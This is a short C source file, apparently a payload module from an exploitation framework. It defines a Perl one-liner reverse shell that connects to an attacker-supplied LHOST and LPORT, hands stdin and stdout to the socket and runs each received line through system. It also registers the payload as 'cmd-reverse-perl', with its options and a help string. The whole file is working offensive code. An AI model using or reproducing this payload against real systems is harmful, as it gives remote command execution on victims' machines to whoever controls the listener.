
#include "../payloads.h"
#include "../exploits.h"
#include <stdlib.h>

// payload's content
unsigned char cmdReversePerlPayload[] = 
"perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,\"%s:%s\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'";

void cmdReversePerlHelp()
{
    printf("creates reverse shell via perl\n");
}

// payload's options
struct payloadParam cmdReversePerlOpts[MAX_NUM_OF_PARAMS] = {
    { "LHOST", REQUIRED, STRING, NULL, NOT_SET },
    { "LPORT", REQUIRED, STRING, NULL, NOT_SET }
    //TODO: INTERNAL param random file name
};

struct payload cmdReversePerl = {
    6,
    "cmd-reverse-perl",
    cmdReversePerlPayload,
    238,
    cmdReversePerlOpts,
    2,
    NULL,
    cmdReversePerlHelp
};
